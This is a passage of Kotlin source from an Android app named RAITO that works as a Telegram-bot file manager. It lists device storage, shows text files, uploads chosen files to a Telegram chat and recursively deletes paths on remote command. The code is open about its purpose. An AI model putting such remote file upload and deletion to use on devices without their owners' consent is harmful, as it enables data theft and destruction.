            "mp4", "mkv", "avi", "mov", "wmv", "flv", "webm", "3gp", "mpeg" -> "🎬"
            "mp3", "wav", "ogg", "m4a", "aac", "flac", "wma", "amr" -> "🎵"
            "txt", "log", "ini", "json", "xml", "html", "css", "js", "md" -> "📝"
            "pdf" -> "📕"
            "doc", "docx" -> "📘"
            "xls", "xlsx" -> "🟢"
            "ppt", "pptx" -> "📙"
            "zip", "rar", "tar", "gz", "7z" -> "📦"
            "apk", "aab" -> "🤖"
            else -> "📄"
        }
    }

    private fun hasStoragePermission(): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            androidx.core.content.ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    private fun fetchFilesAndFoldersPaginated(pathStr: String?, page: Int): Pair<String, JSONObject?> {
        var targetPath = pathStr ?: "/storage/emulated/0"
        
        // Relocate back to standard emulated storage if trying to list root system components
        if (targetPath == "/" || targetPath == "/storage" || targetPath.trim() == "") {
            targetPath = "/storage/emulated/0"
        }
        
        val dir = File(targetPath)
        val isPersian = activeLanguageCode == "fa"

        if (!hasStoragePermission()) {
            val errorMsg = if (isPersian) {
                "❌ *عدم دسترسی به حافظه دستگاه*\n\nرایتو مجوز دسترسی به حافظه را ندارد. لطفاً ابتدا در گوشی خود وارد بخش تنظیمات شده و مجوز دسترسی فایل‌ها یا «مدیریت تمامی فایل‌ها» (All Files Access) را برای برنامه فعال کنید تا لیست فایل‌ها نمایش داده شود."
            } else {
                "❌ *Storage Access Denied*\n\nRAITO does not have filesystem storage authorization. Please toggle ON 'All Files Access' in the application settings inside the Android device first."
            }
            return Pair(errorMsg, buildWelcomeKeyboard())
        }

        if (!dir.exists()) {
            return Pair("❌ *Error:* Directory does not exist: `${dir.absolutePath}`", buildWelcomeKeyboard())
        }
        if (!dir.isDirectory) {
            return Pair("❌ *Error:* Path is a file, not a directory: `${dir.absolutePath}`", buildWelcomeKeyboard())
        }

        val items = try {
            dir.listFiles()
        } catch (e: Exception) {
            null
        }

        if (items == null) {
            val errorMsg = if (isPersian) {
                "❌ *عدم امکان خواندن پوشه*\n\nسیستم اندروید اجازه خواندن این پوشه را به رایتو نمی‌دهد: `${dir.absolutePath}`\nاین پوشه ممکن است سیستمی، محافظت شده یا خالی باشد."
            } else {
                "❌ *Read Directory Failed*\n\nAndroid system disallowed reading this folder path: `${dir.absolutePath}`"
            }
            return Pair(errorMsg, buildWelcomeKeyboard())
        }

        val header = if (isPersian) {
            "📁 *مدیریت فایل هوشمند رایتو (RAITO)*\n\n📍 *مسیر فعلی:* <code>${dir.absolutePath}</code>\n\n"
        } else {
            "📁 *RAITO Advanced File Explorer*\n\n📍 *Current Directory:* <code>${dir.absolutePath}</code>\n\n"
        }

        val sb = StringBuilder(header)

        val foldersList = items.filter { it.isDirectory }.sortedBy { it.name.lowercase(Locale.getDefault()) }
        val filesList = items.filter { it.isFile }.sortedBy { it.name.lowercase(Locale.getDefault()) }
        val combinedList = foldersList + filesList

        val totalItems = combinedList.size
        val pageSize = 30
        val maxPage = if (totalItems == 0) 0 else (totalItems - 1) / pageSize
        val currentPage = page.coerceIn(0, maxPage)

        if (totalItems > 0) {
            sb.append(if (isPersian) "🗂️ <b>لیست کلی محتویات (صفحه ${currentPage + 1} از ${maxPage + 1}):</b>\n\n" else "🗂️ <b>Contents List (Page ${currentPage + 1} of ${maxPage + 1}):</b>\n\n")
            val subList = combinedList.drop(currentPage * pageSize).take(pageSize)
            var index = currentPage * pageSize + 1
            for (item in subList) {
                val emoji = getFileEmoji(item)
                if (item.isDirectory) {
                    sb.append("$index. $emoji <b>${item.name}</b>\n")
                } else {
                    val sizeStr = formatSize(item.length())
                    sb.append("$index. $emoji <b>${item.name}</b> (<code>$sizeStr</code>)\n")
                }
                index++
            }
            if (isPersian) {
                sb.append("\n💡 <b>راهنما:</b> برای ورود به پوشه‌ها یا دیدن گزینه‌های مدیریت فایل، روی دکمه‌های مربوطه در زیر ضربه بزنید!")
            } else {
                sb.append("\n💡 <b>Hint:</b> Tap on any folder or file button below to enter or manage it!")
            }
        } else {
            sb.append(if (isPersian) "🕳️ این پوشه خالی است." else "🕳️ This folder is empty.")
        }

        val dirShortId = encodePathToShortId(dir.absolutePath)
        val keyboard = JSONArray().apply {
            // Row 1: Item pagination controls
            val navRow = JSONArray()
            if (currentPage > 0) {
                navRow.put(JSONObject().apply { put("text", "◀️ Prev"); put("callback_data", "cmd_files_dir_${dirShortId}_p_${currentPage - 1}") })
            }
            
            val parentPath = dir.parentFile?.absolutePath
            if (parentPath != null && parentPath != "/" && parentPath != "/storage") {
                val parentShortId = encodePathToShortId(parentPath)
                navRow.put(JSONObject().apply { put("text", "⬆️ Up (برگشت)"); put("callback_data", "cmd_files_dir_$parentShortId") })
            } else {
                navRow.put(JSONObject().apply { put("text", "📍 Root"); put("callback_data", "cmd_files") })
            }
            
            if (currentPage < maxPage) {
                navRow.put(JSONObject().apply { put("text", "Next ▶️"); put("callback_data", "cmd_files_dir_${dirShortId}_p_${currentPage + 1}") })
            }
            put(navRow)

            // Dynamic Rows: Folders & Files Buttons (Requirement 1: Back, Enter, Exit, Main Menu)
            if (totalItems > 0) {
                val subList = combinedList.drop(currentPage * pageSize).take(pageSize)
                for (item in subList) {
                    val itemRow = JSONArray()
                    val itemShortId = encodePathToShortId(item.absolutePath)
                    val emoji = getFileEmoji(item)
                    if (item.isDirectory) {
                        itemRow.put(JSONObject().apply {
                            put("text", "$emoji ${item.name} (${if (isPersian) "ورود" else "Enter"})")
                            put("callback_data", "cmd_files_dir_$itemShortId")
                        })
                    } else {
                        val sizeStr = formatSize(item.length())
                        itemRow.put(JSONObject().apply {
                            put("text", "$emoji ${item.name} ($sizeStr)")
                            put("callback_data", "cmd_file_sel_$itemShortId")
                        })
                    }
                    put(itemRow)
                }
            }

            // Row 2: Actions inside this directory
            val actionRow = JSONArray()
            actionRow.put(JSONObject().apply { put("text", if (isPersian) "➕ پوشه جدید" else "➕ New Folder"); put("callback_data", "cmd_mkdir_$dirShortId") })
            actionRow.put(JSONObject().apply { put("text", if (isPersian) "📝 فایل جدید" else "📝 New File"); put("callback_data", "cmd_mkfile_$dirShortId") })
            put(actionRow)

            // Row 3: Return home
            val backRow = JSONArray().apply {
                put(JSONObject().apply { put("text", if (isPersian) "🔙 منوی اصلی" else "🔙 Main Menu"); put("callback_data", "cmd_main_menu") })
            }
            put(backRow)
        }
        val replyMarkup = JSONObject().apply { put("inline_keyboard", keyboard) }

        return Pair(sb.toString(), replyMarkup)
    }

    private fun viewFileContent(pathStr: String): String {
        val file = File(pathStr)
        if (!file.exists() || !file.isFile) {
            return "❌ *Error:* File does not exist or is not a standard file."
        }
        val isPersian = activeLanguageCode == "fa"
        if (file.length() > 51200) {
            return if (isPersian) {
                "⚠️ *خطا:* اندازه فایل بیش از ۵۰ کیلوبایت است و قابل نمایش در اینجا نیست.\nلطفا از دستور ارسال زیر استفاده کنید:\n\n📥 دریافت فایل: /file_send_${encodePathToHex(pathStr)}"
            } else {
                "⚠️ *Error:* File exceeds 50 KB limit for inline text display.\nUse the command below to send the file directly:\n\n📥 Send File: /file_send_${encodePathToHex(pathStr)}"
            }
        }

        return try {
            val content = file.readText(Charsets.UTF_8)
            val parentFolder = file.parentFile?.absolutePath ?: ""
            val parentHex = if (parentFolder.isNotEmpty()) encodePathToHex(parentFolder) else ""
            
            val header = if (isPersian) {
                "🔍 *نمایش محتویات فایل:* `${file.name}`\n" +
                "📍 *مسیر:* `${file.absolutePath}`\n" +
                "🔙 بازگشت به پوشه: /files_dir_$parentHex\n\n`"
            } else {
                "🔍 *File Contents:* `${file.name}`\n" +
                "📍 *Path:* `${file.absolutePath}`\n" +
                "🔙 Back to folder: /files_dir_$parentHex\n\n`"
            }
            
            val cleanContent = content.replace("`", "'")
            "$header$cleanContent`"
        } catch (e: Exception) {
            "❌ *Error reading file content:* `${e.localizedMessage}`"
        }
    }

    private fun sendFileToUser(token: String, chat: String, pathStr: String) {
        scope.launch(Dispatchers.IO) {
            val file = File(pathStr)
            val isPersian = activeLanguageCode == "fa"
            if (!file.exists() || !file.isFile) {
                sendBotMessage(token, chat, "❌ *Error:* File not found or is a directory.")
                return@launch
            }
            try {
                val base = com.example.SyncApplication.getTelegramBaseUrl()
                val url = "$base$token/sendDocument"
                val mediaType = "application/octet-stream".toMediaType()
                val requestBody = okhttp3.MultipartBody.Builder()
                    .setType(okhttp3.MultipartBody.FORM)
                    .addFormDataPart("chat_id", chat)
                    .addFormDataPart("document", file.name, file.asRequestBody(mediaType))
                    .build()
                
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()
                
                val statusMsg = if (isPersian) "⏳ در حال ارسال فایل `${file.name}`..." else "⏳ Uploading file `${file.name}`..."
                sendBotMessage(token, chat, statusMsg)

                okHttpClient.newCall(request).execute().use { res ->
                    if (res.isSuccessful) {
                        repository.log("FILES", "Successfully sent file via Telegram: ${file.name}", "SUCCESS")
                    } else {
                        val body = res.body?.string() ?: ""
                        repository.log("FILES", "Failed sending file: ${res.code} $body", "FAILED")
                        val failedMsg = if (isPersian) "❌ خطا در آپلود فایل به تلگرام." else "❌ Telegram transfer failed."
                        sendBotMessage(token, chat, "$failedMsg\n`${res.code} $body`")
                    }
                }
            } catch (e: Exception) {
                repository.log("FILES", "Exception transferring file: ${e.message}", "FAILED")
                sendBotMessage(token, chat, "❌ *Transfer Exception:* `${e.message}`")
            }
        }
    }

    private suspend fun performDeleteFileOrFolder(pathStr: String): String {
        val target = File(pathStr)
        val isPersian = activeLanguageCode == "fa"
        if (!target.exists()) {
            return if (isPersian) "❌ خطا: فایل یا پوشه موجود نیست." else "❌ Error: Target file or folder does not exist."
        }
        val name = target.name
        val parentFolder = target.parentFile?.absolutePath ?: ""
        val parentHex = if (parentFolder.isNotEmpty()) encodePathToHex(parentFolder) else ""
        
        val isDeleted = if (target.isDirectory) {
            target.deleteRecursively()
        } else {
            target.delete()
        }

        return if (isDeleted) {
            repository.log("FILES", "Deleted path remotely: $pathStr", "SUCCESS")
            if (isPersian) {
                "🗑️ *پوشه/فایل حذف شد!*\n\n• مسیر حذف شده: `${name}`\n\n🔙 بازگشت به پوشه: /files_dir_$parentHex"
            } else {
                "🗑️ *File/Folder Purged!*\n\n• Target: `${name}`\n\n🔙 Back to folder: /files_dir_$parentHex"
            }
        } else {
            repository.log("FILES", "Failed deleting path: $pathStr", "FAILED")
            if (isPersian) {
                "❌ *خطا در حذف:* رایتو اجازه حذف این فایل یا پوشه را ندارد."
            } else {
                "❌ *Error:* Failed to delete. Android Security isolation or read-only volume."
            }
        }
    }
}
